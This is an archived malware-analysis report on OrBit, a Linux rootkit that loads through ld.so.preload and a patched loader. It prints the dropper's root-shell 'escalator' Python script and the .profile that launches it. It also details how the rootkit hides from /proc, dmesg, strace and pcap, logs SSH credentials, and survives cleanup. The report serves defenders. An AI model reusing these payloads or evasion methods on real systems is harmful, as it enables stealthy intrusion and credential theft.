{
    "id": "6bf6c582-44ac-4732-beca-f99ba28b3e44",
    "created_at": "2023-01-12T15:08:51.142622Z",
    "updated_at": "2025-03-27T02:06:10.116461Z",
    "deleted_at": null,
    "sha1_hash": "044a5b2fb70d300c8981dde0869c38ac43028d43",
    "title": "2022-07-06 - OrBit- New Undetected Linux Threat Uses Unique Hijack of Execution Flow",
    "authors": "",
    "file_creation_date": "2022-07-18T18:08:47Z",
    "file_modification_date": "2022-07-18T18:08:47Z",
    "file_size": 416338,
    "plain_text": "# OrBit: New Undetected Linux Threat Uses Unique Hijack of Execution Flow\n\n**[intezer.com/blog/incident-response/orbit-new-undetected-linux-threat/](https://www.intezer.com/blog/incident-response/orbit-new-undetected-linux-threat/)**\n\nJuly 6, 2022\n\nWritten by Nicole Fishbein - 6 July 2022\n\n### Get Free Account\n\nJoin Now\n\nLinux is a popular operating system for servers and cloud infrastructures, and as such it’s\n[not a surprise that it attracts threat actors’ interest and we see a continued growth and](https://www.ibm.com/downloads/cas/ADLMYLAZ)\n[innovation of malware that targets Linux, such as the recent Symbiote malware that was](https://www.intezer.com/blog/research/new-linux-threat-symbiote/)\ndiscovered by our research team.\n\nIn this blog we will provide a deep technical analysis of a new and fully undetected\n**Linux threat we named OrBit, because this is one of the filenames that is being used by**\nthe malware to temporarily store the output of executed commands. It can be installed\n\n\n-----\n\neither with persistence capabilities or as a volatile implant. The malware implements\nadvanced evasion techniques and gains persistence on the machine by hooking key\nfunctions, provides the threat actors with remote access capabilities over SSH, harvests\ncredentials, and logs TTY commands. Once the malware is installed it will infect all of the\nrunning processes, including new processes, that are running on the machine.\n\nUnlike other threats that hijack shared libraries by modifying the environment variable\nLD_PRELOAD, this malware uses 2 different ways to load the malicious library. The first\nway is by adding the shared object to the configuration file that is used by the loader. The\nsecond way is by patching the binary of the loader itself so it will load the malicious shared\nobject.\n\n## Technical Analysis\n\n### The OrBit Dropper\n\nThe dropper sample on VT 67048a69a007c37f8be5d01a95f6a026\nThe dropper installs the payload and prepares the environment for the malware execution.\nThe malware can be installed as a volatile module or with persistence capabilities. It\nreceives command line arguments and based on them it extracts the payload to one of the\nlocations. Using the command line arguments the installation path can be swapped and the\ncontent of the payload can be updated or entirely uninstalled. From here on in the report,\nwe will simply use “MALWARE_FOLDER” as referring to the location where the malware\nhas been installed.\n\nTo install the payload and add it to the shared libraries that are being loaded by the dynamic\nlinker, the dropper calls a function called patch_ld. First, it reads the symbolic link of the\ndynamic linker `/lib64/ld-linux-x86-64.so.2 and checks if the malicious payload is`\nalready loaded by searching for the path used by the malware. If it is found the function can\nswap it with the other location. Otherwise, it looks for `/etc/ld.so.preload and replaces`\nit with a symbolic link to the location of malicious library: `/lib/libntpVnQE6mk/.l or`\n\n\n-----\n\n```\n/dev/shm/ldx/.l (depending on the on the argument passed to the dropper). Lastly, it\n\n```\nwill append /etc/ld.so.preload to the end of the temp file to make sure that the malicious\nlibrary will be loaded first.\n\nBefore it loads the malicious library to the dynamic linker, the dropper makes sure to save a\ncopy of the legitimate dynamic linker into `MALWARE_FOLDER/.backup_ld.so so it if`\nneeded it can restore the environment and to use the legitimate data to hide the malware\n(more about in the next section).\n\nThe preparation of the environment is achieved by setting a unique group ID (GID) to the\npath that is used by the malware. In the sample we analyzed the value is 0xE0B2E, the\nsame GID will be used by the payload. In addition, the dropper copies python (from\n/usr/bin/python) to the\n\nMALWARE_FOLDER and creates 4 additional files that will be used by the malware:\n```\n  /lib/libntpVnQE6mk/.logpam\n\n  /lib/libntpVnQE6mk/sshpass.txt\n\n  /lib/libntpVnQE6mk/sshpass2.txt\n\n  /lib/libntpVnQE6mk/.ports\n\n```\nAnd the dropper writes the following 2 files, to grant the threat actors remote access.\n\nThe payload below is saved in `MALWARE_FOLDER/bin/escalator`\n```\nimport os\n\nos.setreuid(0,0)\n\nos.execv(\"/bin/bash\", (\"/bin/bash\", \"-i\"))\n\n```\nThe payload below is saved in `MALWARE_FOLDER/.profile`\n```\n#!/bin/bash\n\nif [ \"$(id -u)\" -ne 0 ] ; then\n\n  echo \"Welcome to $(hostname). You are GID $(id -g), UID $(id -u) and about to be\nescalated to UID 0.\"\n\n  exec ~/bin/python ~/bin/escalator\n\nfi\n\n### The OrBit Payload\n\n```\n\n-----\n\nThe payload sample on VT ac89d638cb6912b58de47ac2a274b2fb\nThe payload is a shared object (.SO file) that can be placed either in persistent storage, for\nexample `/lib/libntpVnQE6mk/, or in shim-memory under` `/dev/shm/ldx/ . If it’s`\nplaced in the first path the malware will be persistent, otherwise it is volatile.\n\nThe shared object hooks functions from 3 libraries: libc, libcap and Pluggable Authentication\nModule (PAM). Existing processes that use these functions will essentially use the modified\nfunctions, and new processes will be hooked with the malicious library as well, allowing the\nmalware to infect the whole machine and harvest credentials, evade detection, gain\npersistence and provide remote access to the attackers.\n\nWhen implementing the hooking of libc functions it first calls syscall with the corresponding\nsystem call number as can be seen in the screenshot below. Strings are obfuscated with\nsimple XOR with a hardcoded key.\n\n\n-----\n\nHooked stat function in the malware\n\n**SSH connection**\n\nOne of the capabilities of the malware is to set up a remote connection on the machine, it\nhooks 3 functions in the Pluggable Authentication Module library: pam_open_session,\n**pam_authenticate and pam_acct_mgmt. By hooking these functions the malware is**\ncapable of stealing information from SSH connections and providing remote access to the\nattackers and hiding the network activity.\n\nWhen the hooked pam_authenticate is called it checks if the user name and the password\nequal to hardcoded values, and if that’s the case it will log the port that is used for the\nconnection in /lib/libntpVnQE6mk/.ports and open the SSH connection. In other cases, it will\ncheck if the file\n\n_/lib/libntpVnQE6mk/.logpam exists (in the sample we analyzed it was created by the_\ndropper) and if so it will log the credentials to a file /lib/libntpVnQE6mk/sshpass.txt.\nEssentially the first file serves as a flag.\n\n**OrBit’s evasion techniques**\n\nTo evade detection the malware hooks multiple functions to prevent them from outputting\ninformation that might reveal the existence of the malicious shared library in the running\nprocesses or the files that are being used by the malware. The malware uses a hardcoded\nGID value (the one set by the dropper) to identify the files and processes that are related to\n\n\n-----\n\nthe malware and based on that it will manipulate the behavior of the hooked functions. For\nexample, readdir is hooked to check the GID of the calling process, if it doesn’t match the\nhardcoded value, all of the directories with the predefined GID value will be omitted from the\nfunction’s output.\n\nCall getgid system call to check the GID of the process\nThe malware hooks functions that open files: fopen, open, open64, and openat and\nchecks if the file that was provided to the relevant open function is part of the proc file\nsystem. One of the paths that is being checked is /proc/net/tcp as it can disclose the\nnetwork traffic generated by the backdoor. The way in which the malware handles the\noutput of this file is similar to other files that are being opened and resembles the\nimplementation in Symbiote. The hooked function reads the content of the file and\ncompares the content, one line at a time to the content of MALWARE_FOLDER/.ports\nwhich holds the information about port and addresses used by the malware. The malware\ncreates a temp file and writes only the lines that don’t expose the malware. Once the file\nhas proceeded, the malware returns the file descriptor to the temp file to the caller.\n\n[The following file paths show the currently mapped memory regions and their access](https://man7.org/linux/man-pages/man5/proc.5.html#:~:text=where%20it%20resides.-,%2Fproc%2F%5Bpid%5D%2Fmaps,-A%20file%20containing)\npermissions:\n\n/proc/%PID%/maps\n/proc/%PID%/smaps\n/proc/%PID%/numa_maps\n\nWhen a process accesses one of these files it may disclose the shared library, therefore the\nhooked open functions verify that the output doesn’t contain a path to the directory used by\nthe malware, in a similar way as described above.\n\nAnother file in the proc filesystem that is being checked is /proc/loadavg. This file is used by\nutilities such as uptime, it provides information about the CPU usage and the status of\ncurrently running processes. The malware will process the information from this file in a\nsimilar way as the previous files.\n\n\n-----\n\nThe malware hooks execve to evade detection of certain utilities, control the behavior of\nprocesses and to maintain its persistence by infecting new processes. The hooking logic\nchecks the process name and path and compares it to different usulites in /bin, /usr and\n/sbin.\n\nThe hooked execve function is used by the malware to hide the network activity, the\nmalware checks if the new process is ip or iptables utility (it checks both the /usr/sbin and\n/sbin) it will first execute the command and pipe the output to a local buffer where it will\ninspect the records and check if there is a match between the records and the information\nstored in MALWARE_FOLDER/.net or MALWARE_FOLDER/.fw – the record will be omitted\nfrom the command’s output.\n\nWhen execve is called with dmesg the malware omits records that are equal to the records\nin MALWARE_FOLDER/.sys/.dmesg, and records that contain one of the following\nkeywords: zapping, tcpdump, promiscuous, libntpVnQE6mk, libdl.so.\n\n**execve checks if the function was called with the environment variable**\n[LD_TRACE_LOADED_OBJECTS, when this variable is set causes the program to list its](https://man7.org/linux/man-pages/man8/ld.so.8.html)\n\ndynamic dependencies. The malware saves the original (unpatched) dynamic linker in a\nbackup file, so when execve is called with this variable the output that will be presented is\nas if the legitimate dynamic linker was called and it will not list the malicious library.\nEssentially the following command is being executed:\n```\nMALWARE_FOLDER/.backup_ld --list %s\n\n```\nStrace is another utility that is being examined by the hooked execve. Because the output\nof strace can reveal the malicious library as one of the libraries that is being loaded by a\ntraced process. Strace can be executed with the -o flag that specifies a file path to which\nthe output will be piped, if it’s not set in the command the malware will write the output of\nstrace to /tmp/.orbit. Similar to other utilities, the malware executes the command and gets\nthe result from the output file. Next it omits records that contain the symlink one of the\nfollowing: the malicious library (MALWARE_FOLDER/.l), the GID which is used by the\nmalware (920366) and its folder path.\n\n\n-----\n\n**Achieving Persistence**\n\nThe malware uses two methods to achieve persistence. The reason the malware uses both\nof the methods is to make it hard removing the malware from an infected machine while it’s\nrunning. The first method adds the path to the malware into the /etc/ld.so.preload\nconfiguration file. This instructs the loader that the malware should be loaded first and for all\nnew processes. In the case this method is prevented by, for example removing the\nconfiguration file on the infected machine, the malware has its second method which is\nachieved by patching the loader binary.\n\nThe malware first makes a copy of the loader’s binary so it can patch it. It performs a simple\nsearch in the binary for the string “/etc/ld.so.preload”. Once it’s found, it replaces the string\nto a path to a file within the %MALWARE_FOLDER%. The content of this file has the path\nto the malware library to act as a ld.so.preload configuration file. This means when the\npatch loader is executed, it uses the file in the %MALWARE_FOLDER% instead under\n“/etc”. The malware author has set up these two methods to act as catches in the case one\nof them goes away. For example, if an administrator wants to stop the malware from being\nloaded by removing the configuration file under “/etc” so the hidden files can be revealed,\nthe patched loader who doesn’t use this file, will just load the malware who will recreate the\nconfiguration file. If the administrator instead overwrites the patched loader with a clean\nversion, the clean loader loads the malware from the “ld.so.preload” configuration file which\nrepatches the loader.\n\n**Information Stealing**\n\n\n-----\n\nThe backdoor hooks the read and write functions to log data that is being written by the\nexecuted processes on the machine. The backdoor checks the flag: sniff_ssh_session that\ndefines whether any call to write will be logged or only processes executed with sudo or ssh\nsessions. Appears that the functionality of the flag doesn’t reflect the actual flow of the write\nfunction – when the flag is set to false the hooked function checks if the process was\nexecuted with sudo or if the calling process is ssh and logs the buffer that was passed to\nthe original write function, the data is stored at: MALWARE_FOLDER/sshpass2.txt.\nOtherwise when the flag is set to true, the buffer is logged to MALWARE_FOLDER/sniff.txt\nwithout verification of the calling process name. Once the hooked function is done it will\nreturn the return value of the original function call.\n\nChecking the flag sniff_ssh_session.\nFor bash and sh processes that call execve the hook will log the path argument that holds\nthe path to the file that will be executed as a new process, the hooked function will append\na timestamp and the full path and write the information into MALWARE_FOLDER/execlog.\n\n**Network Capabilities**\n\nThe backdoor hooks function from the libpcap library to hide network activity. If hooks bind\nand connect functions to log the ports that are being used by processes with the malwar’s\ngid, the ports are being written to MALWARE_FOLDER/.ports. The content of this file is\nused by the backdoor to manage the ports that are being used in sessions that were\nopened by the activity of the backdoor. When a new SSH session is created the port and IP\naddress is being written to the file.\n\nThe malware hooks the pcap_loop function and pcap_packet_callback to filter out the\ntraffic of the backdoor. To accomplish this task the hooked pcap_packet_callback omits\nports that are in MALWARE_FOLDER/.ports as it contains all of the ports used by the\nbackdoor.\n\n## Comparing to other Linux threats\n\n\n-----\n\nWhile it s common for malware to hook functions, the usual technique is by loading a\n[shared library using LD_PRELOAD – that was the case for Symbiote, HiddenWasp and](https://www.intezer.com/blog/malware-analysis/hiddenwasp-malware-targeting-linux-systems/)\nother threats.\n\nThis malware uses XOR encrypted strings and steals passwords – similar to other Linux\n[backdoors reported by ESET. But unlike other threats, this malware steals information from](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)\ndifferent commands and utilities and stores them in specific files on the machine. Besides,\nthere is an extensive usage of files for storing data, something that was not seen before.\n\nWhat makes this malware especially interesting is the almost hermetic hooking of libraries\non the victim machine, that allows the malware to gain persistence and evade detection\nwhile stealing information and setting SSH backdoor.\n\n## Conclusion\n\nThreats that target Linux continue to evolve while successfully staying under the radar of\nsecurity tools, now OrBit is one more example of how evasive and persistent new malware\ncan be.\n\n_I want to thank Joakim Kennedy for his contribution to this research._\n\n## IoCs\n\n**Hash** **File**\n\n[f1612924814ac73339f777b48b0de28b716d606e142d4d3f4308ec648e3f56c8](https://analyze.intezer.com/files/f1612924814ac73339f777b48b0de28b716d606e142d4d3f4308ec648e3f56c8) Dropper\n\n[40b5127c8cf9d6bec4dbeb61ba766a95c7b2d0cafafcb82ede5a3a679a3e3020](https://analyze.intezer.com/files/40b5127c8cf9d6bec4dbeb61ba766a95c7b2d0cafafcb82ede5a3a679a3e3020) Payload\n\n**Nicole Fishbein**\nNicole is a malware analyst and reverse engineer. Prior to Intezer she was an embedded\nresearcher in the Israel Defense Forces (IDF) Intelligence Corps.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-06 - OrBit- New Undetected Linux Threat Uses Unique Hijack of Execution Flow.pdf"
    ],
    "report_names": [
        "2022-07-06 - OrBit- New Undetected Linux Threat Uses Unique Hijack of Execution Flow.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536131,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1658167727,
    "ts_modification_date": 1658167727,
    "files": {
        "pdf": "https://archive.orkl.eu/044a5b2fb70d300c8981dde0869c38ac43028d43.pdf",
        "text": "https://archive.orkl.eu/044a5b2fb70d300c8981dde0869c38ac43028d43.txt",
        "img": "https://archive.orkl.eu/044a5b2fb70d300c8981dde0869c38ac43028d43.jpg"
    }
}